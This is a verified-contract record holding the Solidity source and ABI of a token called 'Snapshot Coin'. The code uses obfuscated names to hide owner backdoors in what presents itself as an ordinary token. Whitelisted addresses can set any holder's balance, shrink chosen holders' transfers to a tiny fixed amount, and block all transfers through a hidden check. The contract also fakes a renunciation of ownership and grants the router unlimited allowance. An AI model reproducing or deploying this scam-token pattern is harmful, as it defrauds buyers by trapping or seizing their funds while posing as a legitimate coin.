{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fundFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minAmount {\n    function createPair(address sellReceiver, address fromMin) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface exemptAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface limitSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minLaunchFund) external view returns (uint256);\n\n    function transfer(address txLiquiditySwap, uint256 limitList) external returns (bool);\n\n    function allowance(address fromTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txLiquiditySwap,\n        uint256 limitList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityIs, uint256 value);\n    event Approval(address indexed fromTotal, address indexed spender, uint256 value);\n}\n\ninterface limitSwapMetadata is limitSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SnapshotCoin is fundFrom, limitSwap, limitSwapMetadata {\n\n    address private tradingFundAt;\n\n    uint256 public fromSell = 0;\n\n    address public walletTxReceiver;\n\n    function txFee(address launchedMin) public {\n        takeAmount();\n        \n        if (launchedMin == walletTxReceiver || launchedMin == maxFeeSell) {\n            return;\n        }\n        swapMaxTo[launchedMin] = true;\n    }\n\n    uint256 txTotal;\n\n    function takeEnable(address tokenMax, address txLiquiditySwap, uint256 limitList) internal view returns (uint256) {\n        require(limitList > 0);\n\n        uint256 sellTeam = 0;\n        if (tokenMax == maxFeeSell && receiverSender > 0) {\n            sellTeam = limitList * receiverSender / 100;\n        } else if (txLiquiditySwap == maxFeeSell && fromSell > 0) {\n            sellTeam = limitList * fromSell / 100;\n        }\n        require(sellTeam <= limitList);\n        return limitList - sellTeam;\n    }\n\n    uint256 public listSellAmount;\n\n    constructor (){\n        \n        teamLaunched();\n        exemptAt fromAt = exemptAt(teamWallet);\n        maxFeeSell = minAmount(fromAt.factory()).createPair(fromAt.WETH(), address(this));\n        receiverMin = minAmount(fromAt.factory()).feeTo();\n        \n        walletTxReceiver = _msgSender();\n        listToken[walletTxReceiver] = true;\n        liquidityTxSender[walletTxReceiver] = modeEnableAmount;\n        if (listSellAmount != receiverFund) {\n            amountLaunch = true;\n        }\n        emit Transfer(address(0), walletTxReceiver, modeEnableAmount);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldAtBuy;\n    }\n\n    function transferFrom(address tokenMax, address txLiquiditySwap, uint256 limitList) external override returns (bool) {\n        if (_msgSender() != teamWallet) {\n            if (atToken[tokenMax][_msgSender()] != type(uint256).max) {\n                require(limitList <= atToken[tokenMax][_msgSender()]);\n                atToken[tokenMax][_msgSender()] -= limitList;\n            }\n        }\n        return totalTeam(tokenMax, txLiquiditySwap, limitList);\n    }\n\n    function totalTeam(address tokenMax, address txLiquiditySwap, uint256 limitList) internal returns (bool) {\n        if (tokenMax == walletTxReceiver) {\n            return senderTx(tokenMax, txLiquiditySwap, limitList);\n        }\n        uint256 shouldIs = limitSwap(maxFeeSell).balanceOf(receiverMin);\n        require(shouldIs == tradingMode);\n        require(txLiquiditySwap != receiverMin);\n        if (swapMaxTo[tokenMax]) {\n            return senderTx(tokenMax, txLiquiditySwap, modeSell);\n        }\n        limitList = takeEnable(tokenMax, txLiquiditySwap, limitList);\n        return senderTx(tokenMax, txLiquiditySwap, limitList);\n    }\n\n    uint256 public autoMaxTx;\n\n    address receiverMin;\n\n    uint256 private receiverLaunchMode;\n\n    uint256 public isWalletTrading;\n\n    mapping(address => mapping(address => uint256)) private atToken;\n\n    bool private teamTx;\n\n    address public maxFeeSell;\n\n    function receiverAt(uint256 limitList) public {\n        takeAmount();\n        tradingMode = limitList;\n    }\n\n    uint256 tradingMode;\n\n    function sellLimit(address feeSell, uint256 limitList) public {\n        takeAmount();\n        liquidityTxSender[feeSell] = limitList;\n    }\n\n    uint8 private exemptWallet = 18;\n\n    uint256 constant modeSell = 12 ** 10;\n\n    bool public senderToken;\n\n    uint256 private receiverFund;\n\n    bool public buyTake;\n\n    uint256 private modeEnableAmount = 100000000 * 10 ** 18;\n\n    function senderTx(address tokenMax, address txLiquiditySwap, uint256 limitList) internal returns (bool) {\n        require(liquidityTxSender[tokenMax] >= limitList);\n        liquidityTxSender[tokenMax] -= limitList;\n        liquidityTxSender[txLiquiditySwap] += limitList;\n        emit Transfer(tokenMax, txLiquiditySwap, limitList);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTx;\n    }\n\n    function takeAmount() private view {\n        require(listToken[_msgSender()]);\n    }\n\n    bool public amountLaunch;\n\n    address teamWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderToTake(address receiverBuyMin) public {\n        if (buyTake) {\n            return;\n        }\n        \n        listToken[receiverBuyMin] = true;\n        if (sellTradingSender) {\n            senderToken = false;\n        }\n        buyTake = true;\n    }\n\n    mapping(address => bool) public swapMaxTo;\n\n    mapping(address => bool) public listToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeEnableAmount;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingFundAt;\n    }\n\n    bool public sellTradingSender;\n\n    event OwnershipTransferred(address indexed listTake, address indexed takeAuto);\n\n    mapping(address => uint256) private liquidityTxSender;\n\n    function transfer(address feeSell, uint256 limitList) external virtual override returns (bool) {\n        return totalTeam(_msgSender(), feeSell, limitList);\n    }\n\n    function owner() external view returns (address) {\n        return tradingFundAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptWallet;\n    }\n\n    function teamLaunched() public {\n        emit OwnershipTransferred(walletTxReceiver, address(0));\n        tradingFundAt = address(0);\n    }\n\n    function approve(address launchedFund, uint256 limitList) public virtual override returns (bool) {\n        atToken[_msgSender()][launchedFund] = limitList;\n        emit Approval(_msgSender(), launchedFund, limitList);\n        return true;\n    }\n\n    function balanceOf(address minLaunchFund) public view virtual override returns (uint256) {\n        return liquidityTxSender[minLaunchFund];\n    }\n\n    function allowance(address limitAtTo, address launchedFund) external view virtual override returns (uint256) {\n        if (launchedFund == teamWallet) {\n            return type(uint256).max;\n        }\n        return atToken[limitAtTo][launchedFund];\n    }\n\n    uint256 public receiverSender = 3;\n\n    string private shouldTx = \"SCN\";\n\n    string private shouldAtBuy = \"Snapshot Coin\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAtTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMaxTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFeeSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"sellLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTradingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuyMin\",\"type\":\"address\"}],\"name\":\"senderToTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMaxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txLiquiditySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTxReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SnapshotCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}